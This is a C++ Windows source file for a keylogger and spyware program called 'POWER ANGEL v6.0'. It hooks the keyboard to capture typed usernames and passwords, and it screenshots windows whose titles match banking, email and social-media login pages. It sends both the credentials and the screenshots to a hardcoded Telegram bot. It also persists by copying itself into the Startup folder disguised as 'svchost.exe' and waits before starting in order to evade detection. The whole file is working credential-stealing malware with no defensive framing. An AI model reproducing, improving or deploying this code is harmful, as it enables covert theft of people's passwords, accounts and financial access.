#define WIN32_LEAN_AND_MEAN
#define STRICT
#define _CRT_SECURE_NO_WARNINGS
#define UNICODE

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <commctrl.h>
#include <shellapi.h>
#include <mutex>
#include <thread>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>
#include <sstream>
#include <iomanip>
#include <fstream>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")

using namespace Gdiplus;

// 🔥 CONFIG
const char* BOT_TOKEN_ANSI = "7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const char* CHAT_ID_ANSI = "7845441585";
const wchar_t* MUTEX_NAME = L"PowerAngelSmartMichael_v6.0";

// Globals
std::mutex g_mutex;
std::wstring g_username, g_password;
bool g_running = true;
ULONG_PTR g_gdiplusToken;
HHOOK g_hKeyboardHook = NULL;
std::wstring g_currentField;

// Debug
void DebugLog(const std::wstring& message) {
    std::wofstream logfile(L"angel_debug.log", std::ios::app);
    if (logfile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        logfile << L"[" << st.wHour << L":" << st.wMinute << L":" << st.wSecond << L"] ";
        logfile << message << std::endl;
        logfile.close();
    }
}

// 🔥 PERFECT UTF8 CONVERSION
std::string WStringToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size_needed, NULL, NULL);
    str.pop_back(); // Remove null terminator
    return str;
}

// 🔥 URL ENCODING FOR SPECIAL CHARACTERS
std::string URLEncode(const std::string& value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    
    for (char c : value) {
        // Keep alphanumeric and other accepted characters unchanged
        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~' || c == ' ' || c == '\n') {
            if (c == ' ') escaped << '+';
            else if (c == '\n') escaped << "%0A";
            else escaped << c;
        } else {
            // Any other characters are percent-encoded
            escaped << '%' << std::setw(2) << int((unsigned char)c);
        }
    }
    return escaped.str();
}

// 🔥 FIXED TELEGRAM SENDER - PROPERLY FORMATTED
bool SendTelegram(const std::wstring& message) {
    std::string utf8_msg = WStringToUTF8(message);
    std::string encoded_msg = URLEncode(utf8_msg);
    std::string post_data = "chat_id=" + std::string(CHAT_ID_ANSI) + "&text=" + encoded_msg;
    
    DebugLog(L"📨 Sending Telegram: " + message.substr(0, min(50, (int)message.length())));
    DebugLog(L"📐 Data length: " + std::to_wstring(post_data.length()));
    
    HINTERNET session = WinHttpOpen(L"PowerAngel/6.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) {
        DebugLog(L"❌ WinHttpOpen failed");
        return false;
    }
    
    // Set timeouts
    WinHttpSetTimeouts(session, 30000, 30000, 30000, 30000);
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        DebugLog(L"❌ WinHttpConnect failed: " + std::to_wstring(GetLastError()));
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::wstring wtoken(BOT_TOKEN_ANSI, BOT_TOKEN_ANSI + strlen(BOT_TOKEN_ANSI));
    std::wstring url = L"/bot" + wtoken + L"/sendMessage";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", url.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        DebugLog(L"❌ WinHttpOpenRequest failed");
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }
    
    // Set headers properly
    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n"
                      L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n";
    
    if (!WinHttpAddRequestHeaders(request, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD)) {
        DebugLog(L"⚠️ WinHttpAddRequestHeaders failed: " + std::to_wstring(GetLastError()));
    }
    
    // Send the request with proper parameters
    BOOL result = WinHttpSendRequest(request, 
                                    WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 
                                    (DWORD)post_data.length(), 0);
    
    if (result) {
        // Write the POST data
        DWORD bytesWritten = 0;
        result = WinHttpWriteData(request, post_data.c_str(), 
                                 (DWORD)post_data.length(), &bytesWritten);
        
        DebugLog(L"📝 Bytes written to request: " + std::to_wstring(bytesWritten));
        
        if (result && bytesWritten == post_data.length()) {
            result = WinHttpReceiveResponse(request, NULL);
            
            if (result) {
                // Check HTTP status code
                DWORD statusCode = 0;
                DWORD size = sizeof(statusCode);
                WinHttpQueryHeaders(request, 
                                   WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                   NULL, &statusCode, &size, NULL);
                
                DebugLog(L"📡 HTTP Status Code: " + std::to_wstring(statusCode));
                
                if (statusCode == 200) {
                    DebugLog(L"✅ Telegram message sent successfully!");
                } else {
                    // Read response for debugging
                    char response[4096] = {0};
                    DWORD bytesRead = 0;
                    WinHttpReadData(request, response, sizeof(response)-1, &bytesRead);
                    if (bytesRead > 0) {
                        std::wstring wresponse(response, response + bytesRead);
                        DebugLog(L"📄 Telegram API Response: " + wresponse);
                    }
                }
            }
        } else {
            DebugLog(L"❌ WinHttpWriteData failed or incomplete: " + std::to_wstring(GetLastError()));
        }
    } else {
        DebugLog(L"❌ WinHttpSendRequest failed: " + std::to_wstring(GetLastError()));
    }
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    return result != FALSE;
}

// 🔥 PHOTO UPLOADER - FIXED BOUNDARY
bool SendTelegramPhoto(const std::wstring& filepath) {
    DebugLog(L"📸 UPLOADING: " + filepath);
    
    HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, 
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DebugLog(L"❌ Cannot open file: " + filepath);
        return false;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        DebugLog(L"❌ Invalid file size");
        return false;
    }
    
    std::vector<BYTE> fileData(fileSize);
    DWORD bytesRead;
    if (!ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        CloseHandle(hFile);
        DebugLog(L"❌ Failed to read file");
        return false;
    }
    CloseHandle(hFile);
    
    // Generate boundary
    char boundary[64];
    sprintf_s(boundary, "----AngelBoundary%llu", GetTickCount64());
    
    // Build multipart form data
    std::string header = 
        std::string("--") + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + 
        std::string(CHAT_ID_ANSI) + "\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
        "📸 POWER ANGEL v6.0 Screenshot\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n"
        "Content-Type: image/jpeg\r\n\r\n";
    
    std::string footer = "\r\n--" + std::string(boundary) + "--\r\n";
    
    std::vector<BYTE> postData;
    postData.reserve(header.size() + fileData.size() + footer.size());
    postData.insert(postData.end(), header.begin(), header.end());
    postData.insert(postData.end(), fileData.begin(), fileData.end());
    postData.insert(postData.end(), footer.begin(), footer.end());
    
    DebugLog(L"📸 Photo data size: " + std::to_wstring(postData.size()) + L" bytes");
    
    HINTERNET session = WinHttpOpen(L"PowerAngel/6.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) {
        DebugLog(L"❌ WinHttpOpen failed for photo");
        return false;
    }
    
    WinHttpSetTimeouts(session, 60000, 60000, 60000, 60000);
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        DebugLog(L"❌ WinHttpConnect failed for photo");
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::wstring wtoken(BOT_TOKEN_ANSI, BOT_TOKEN_ANSI + strlen(BOT_TOKEN_ANSI));
    std::wstring photourl = L"/bot" + wtoken + L"/sendPhoto";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", photourl.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        DebugLog(L"❌ WinHttpOpenRequest failed for photo");
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::string contentType = "Content-Type: multipart/form-data; boundary=" + std::string(boundary);
    std::wstring wcontentType(contentType.begin(), contentType.end());
    wcontentType += L"\r\n";
    
    if (!WinHttpAddRequestHeaders(request, wcontentType.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD)) {
        DebugLog(L"⚠️ Failed to add content-type header");
    }
    
    BOOL result = WinHttpSendRequest(request, 
                                    WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 
                                    (DWORD)postData.size(), 0);
    
    if (result) {
        DWORD bytesWritten = 0;
        result = WinHttpWriteData(request, postData.data(), 
                                 (DWORD)postData.size(), &bytesWritten);
        
        DebugLog(L"📸 Photo bytes written: " + std::to_wstring(bytesWritten));
        
        if (result) {
            result = WinHttpReceiveResponse(request, NULL);
            
            if (result) {
                DWORD statusCode = 0;
                DWORD size = sizeof(statusCode);
                WinHttpQueryHeaders(request, 
                                   WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                   NULL, &statusCode, &size, NULL);
                
                DebugLog(L"📡 Photo HTTP Status: " + std::to_wstring(statusCode));
                
                if (statusCode != 200) {
                    char response[4096] = {0};
                    DWORD bytesRead = 0;
                    WinHttpReadData(request, response, sizeof(response)-1, &bytesRead);
                    if (bytesRead > 0) {
                        DebugLog(L"📄 Photo API Response: " + std::wstring(response, response + bytesRead));
                    }
                }
            }
        }
    } else {
        DebugLog(L"❌ WinHttpSendRequest failed for photo: " + std::to_wstring(GetLastError()));
    }
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    // Clean up temp file
    DeleteFileW(filepath.c_str());
    
    return result != FALSE;
}

// Keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        
        if (pKb->vkCode == VK_TAB) {
            if (!g_currentField.empty()) {
                if (g_username.empty()) {
                    g_username = g_currentField;
                    DebugLog(L"👤 Username captured: " + g_username);
                } else {
                    g_password = g_currentField;
                    DebugLog(L"🔑 Password captured");
                }
                g_currentField.clear();
            }
            return 1;
        }
        
        if (pKb->vkCode == VK_RETURN) {
            if (!g_username.empty() && !g_password.empty()) {
                std::wstring creds = L"🔥 POWER ANGEL v6.0 - CREDENTIALS:\n👤 " + g_username + L"\n🔑 " + g_password;
                DebugLog(L"📤 Sending credentials to Telegram");
                SendTelegram(creds);
                g_username.clear();
                g_password.clear();
                g_currentField.clear();
            }
            return 1;
        }
        
        if ((pKb->vkCode >= 0x30 && pKb->vkCode <= 0x39) || 
            (pKb->vkCode >= 0x41 && pKb->vkCode <= 0x5A) ||
            (pKb->vkCode >= 0x60 && pKb->vkCode <= 0x69) || // Numpad
            pKb->vkCode == VK_SPACE || pKb->vkCode == VK_OEM_MINUS ||
            pKb->vkCode == VK_OEM_PERIOD || pKb->vkCode == VK_OEM_COMMA ||
            pKb->vkCode == VK_OEM_1 || pKb->vkCode == VK_OEM_2 ||
            pKb->vkCode == VK_OEM_3 || pKb->vkCode == VK_OEM_4 ||
            pKb->vkCode == VK_OEM_5 || pKb->vkCode == VK_OEM_6 ||
            pKb->vkCode == VK_OEM_7) {
            
            BYTE keyState[256] = {0};
            WCHAR buffer[10] = {0};
            GetKeyboardState(keyState);
            
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) keyState[VK_SHIFT] = 0x80;
            if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) keyState[VK_CAPITAL] = 0x01;
            if (GetAsyncKeyState(VK_CONTROL) & 0x8000) return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            
            int result = ToUnicode(pKb->vkCode, pKb->scanCode, keyState, buffer, 10, 0);
            if (result > 0) {
                g_currentField += buffer[0];
                DebugLog(L"⌨️ Key pressed: " + std::wstring(buffer, result));
            }
        }
        
        // Handle backspace
        if (pKb->vkCode == VK_BACK && !g_currentField.empty()) {
            g_currentField.pop_back();
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// Screenshot utils
std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";
    WCHAR title[512];
    if (GetWindowTextW(hwnd, title, 512) > 0) {
        return std::wstring(title);
    }
    return L"";
}

bool IsLoginPage(const std::wstring& title) {
    if (title.empty()) return false;
    std::wstring lower = title;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
    std::vector<std::wstring> targets = {
        L"gmail", L"facebook", L"login", L"signin", L"bank", 
        L"paypal", L"pay", L"outlook", L"microsoft", L"google",
        L"yahoo", L"amazon", L"ebay", L"twitter", L"instagram",
        L"linkedin", L"apple", L"icloud", L"password", L"account"
    };
    for (auto& t : targets) {
        if (lower.find(t) != std::wstring::npos) {
            DebugLog(L"🔍 Login page detected: " + title);
            return true;
        }
    }
    return false;
}

// 🔥 FIXED SCREENSHOT WITH PROPER GDI+
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT  num = 0;          
    UINT  size = 0;         
    ImageCodecInfo* pImageCodecInfo = NULL;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }    
    }
    free(pImageCodecInfo);
    return -1;
}

bool TakeSmartScreenshot() {
    std::wstring title = GetActiveWindowTitle();
    if (!IsLoginPage(title)) return false;
    
    Sleep(500); // Wait a bit for page to load
    
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return false;
    
    HDC hdcScreen = GetDC(hwnd);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    RECT rc; 
    GetWindowRect(hwnd, &rc);
    
    // Ensure window is not minimized
    if (IsIconic(hwnd)) {
        ReleaseDC(hwnd, hdcScreen);
        DeleteDC(hdcMem);
        return false;
    }
    
    int w = rc.right - rc.left;
    int h = rc.bottom - rc.top;
    
    if (w <= 0 || h <= 0) {
        ReleaseDC(hwnd, hdcScreen); 
        DeleteDC(hdcMem);
        return false;
    }
    
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, w, h);
    if (!hbm) {
        ReleaseDC(hwnd, hdcScreen);
        DeleteDC(hdcMem);
        return false;
    }
    
    HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
    
    Bitmap* bmp = Bitmap::FromHBITMAP(hbm, NULL);
    SelectObject(hdcMem, old);
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(hwnd, hdcScreen);
    
    if (!bmp) return false;
    
    CLSID jpegClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) == -1) {
        delete bmp;
        return false;
    }
    
    WCHAR tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    SYSTEMTIME st; 
    GetLocalTime(&st);
    WCHAR filename[MAX_PATH];
    swprintf_s(filename, L"power_angel_%04d%02d%02d_%02d%02d%02d.jpg",
               st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    
    std::wstring fullPath = std::wstring(tempPath) + filename;
    
    // Set JPEG quality
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 85; // Good quality with reasonable size
    encoderParams.Parameter[0].Value = &quality;
    
    Status stat = bmp->Save(fullPath.c_str(), &jpegClsid, &encoderParams);
    delete bmp;
    
    if (stat != Ok) {
        DebugLog(L"❌ Failed to save screenshot: " + fullPath);
        return false;
    }
    
    DebugLog(L"✅ Screenshot saved: " + fullPath);
    
    // Send to Telegram
    bool success = SendTelegramPhoto(fullPath);
    
    // Clean up temp file if sending failed
    if (!success) {
        DeleteFileW(fullPath.c_str());
    }
    
    return success;
}

// Persistence
void InstallPersistence() {
    WCHAR path[MAX_PATH], startup[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    GetEnvironmentVariableW(L"APPDATA", startup, MAX_PATH);
    wcscat_s(startup, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe");
    
    // Copy to startup folder
    if (CopyFileW(path, startup, FALSE)) {
        DebugLog(L"✅ Persistence installed: " + std::wstring(startup));
    } else {
        DebugLog(L"❌ Failed to install persistence: " + std::to_wstring(GetLastError()));
    }
}

// Threads
void HeartbeatThread() {
    Sleep(60000); // Wait 1 minute before first heartbeat
    
    while (g_running) {
        SendTelegram(L"👼 POWER ANGEL v6.0 - System Active");
        std::this_thread::sleep_for(std::chrono::hours(6));
    }
}

void ScreenshotThread() {
    int screenshotCount = 0;
    
    while (g_running) {
        if (TakeSmartScreenshot()) {
            screenshotCount++;
            DebugLog(L"📸 Screenshot #" + std::to_wstring(screenshotCount) + L" sent successfully");
            // Longer delay after successful screenshot
            std::this_thread::sleep_for(std::chrono::seconds(30));
        } else {
            // Shorter delay when no screenshot taken
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Delete old log file and create new one
    DeleteFileW(L"angel_debug.log");
    DebugLog(L"🚀 POWER ANGEL v6.0 STARTING");
    
    // Ensure single instance
    HANDLE mutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        DebugLog(L"⚠️ Another instance is already running. Exiting.");
        return 0;
    }
    
    // Initialize GDI+
    GdiplusStartupInput input;
    GdiplusStartup(&g_gdiplusToken, &input, NULL);
    DebugLog(L"✅ GDI+ Initialized");
    
    // Initial delay to avoid detection
    Sleep(5000);
    
    // Send startup message
    DebugLog(L"📤 Sending startup message to Telegram");
    if (SendTelegram(L"🔥 POWER ANGEL v6.0 DEPLOYED!\n📊 Keyboard logging: ACTIVE\n📸 Smart screenshots: ACTIVE\n⏰ Heartbeat: 6 hours")) {
        DebugLog(L"✅ Startup message sent successfully");
    } else {
        DebugLog(L"❌ Failed to send startup message");
    }
    
    // Install persistence
    InstallPersistence();
    
    // Install keyboard hook
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (g_hKeyboardHook) {
        DebugLog(L"✅ Keyboard hook installed");
    } else {
        DebugLog(L"❌ Failed to install keyboard hook: " + std::to_wstring(GetLastError()));
    }
    
    // Start threads
    std::thread heartbeat(HeartbeatThread);
    std::thread screenshot(ScreenshotThread);
    
    DebugLog(L"✅ All threads started. Entering message loop.");
    
    // Main message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    g_running = false;
    DebugLog(L"🛑 Shutting down...");
    
    if (heartbeat.joinable()) heartbeat.join();
    if (screenshot.joinable()) screenshot.join();
    
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
        DebugLog(L"✅ Keyboard hook removed");
    }
    
    GdiplusShutdown(g_gdiplusToken);
    DebugLog(L"✅ GDI+ Shutdown");
    
    if (mutex) ReleaseMutex(mutex);
    
    DebugLog(L"🎯 POWER ANGEL v6.0 EXITED");
    
    return 0;
}
